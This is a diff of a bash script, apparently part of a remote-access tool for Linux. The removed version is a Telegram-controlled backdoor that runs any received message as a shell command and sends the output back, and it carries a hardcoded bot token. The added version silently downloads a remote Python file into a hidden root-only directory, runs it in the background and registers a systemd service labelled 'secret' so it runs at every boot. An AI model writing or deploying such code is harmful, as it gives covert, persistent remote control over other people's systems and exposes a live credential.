@@ -1,38 +1,56 @@
 #!/bin/bash
-# Telegram Remote Command Executor (Full Access)
-# Personal use only
+# -----------------------------
+# Auto-run Python script in background at startup
+# -----------------------------
 
-BOT_TOKEN="7888336988:AAFzsewYXVT0Grxx7fQwKydxcKNMlUkLXqk"
-CHAT_ID="5634946920"
+# -----------------------------
+# Configuration
+# -----------------------------
+PYTHON_FILE_URL="https://raw.githubusercontent.com/sahed-msd/RTA_Linux/f65ba177406cda654f9d694dd928a18f4fca6ab3/PFIWZV.py"
+SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
+DEST_FILE="$SECRET_DIR/PFIWZV.py"
 
-LAST_UPDATE_ID=0
+# -----------------------------
+# Ensure secret directory exists
+# -----------------------------
+if [ ! -d "$SECRET_DIR" ]; then
+    mkdir -p "$SECRET_DIR"
+    chmod 700 "$SECRET_DIR"  # Only root can access
+fi
 
-while true; do
-    # Telegram থেকে নতুন আপডেট আনা
-    UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID+1))")
-    
-    COUNT=$(echo "$UPDATES" | jq '.result | length')
-    
-    if [[ $COUNT -gt 0 ]]; then
-        for ((i=0;i<$COUNT;i++)); do
-            MESSAGE=$(echo "$UPDATES" | jq -r ".result[$i].message.text")
-            UPDATE_ID=$(echo "$UPDATES" | jq -r ".result[$i].update_id")
-            CHAT=$(echo "$UPDATES" | jq -r ".result[$i].message.chat.id")
+# -----------------------------
+# Download Python script silently
+# -----------------------------
+curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
+chmod 700 "$DEST_FILE"  # Make it executable only by root
 
-            # কমান্ড এক্সিকিউট
-            OUTPUT=$(bash -c "$MESSAGE" 2>&1)
+# -----------------------------
+# Run the script in background
+# -----------------------------
+nohup python3 "$DEST_FILE" >/dev/null 2>&1 &
 
-            # আউটপুট Telegram এ পাঠানো
-            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-                 -d chat_id="$CHAT" \
-                 -d reply_to_message_id="$(echo "$UPDATES" | jq -r ".result[$i].message.message_id")" \
-                 -d text="💻 Command: $MESSAGE
-----------------
-$OUTPUT"
+# -----------------------------
+# Ensure script runs on startup
+# -----------------------------
+AUTOSTART_FILE="/etc/systemd/system/python_auto.service"
 
-            LAST_UPDATE_ID=$UPDATE_ID
-        done
-    fi
+if [ ! -f "$AUTOSTART_FILE" ]; then
+    cat <<EOL > "$AUTOSTART_FILE"
+[Unit]
+Description=Auto-run secret Python script
+After=network.target
 
-    sleep 2
-done
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 $DEST_FILE
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOL
+
+    # Reload systemd and enable the service
+    systemctl daemon-reload
+    systemctl enable python_auto.service
+fi
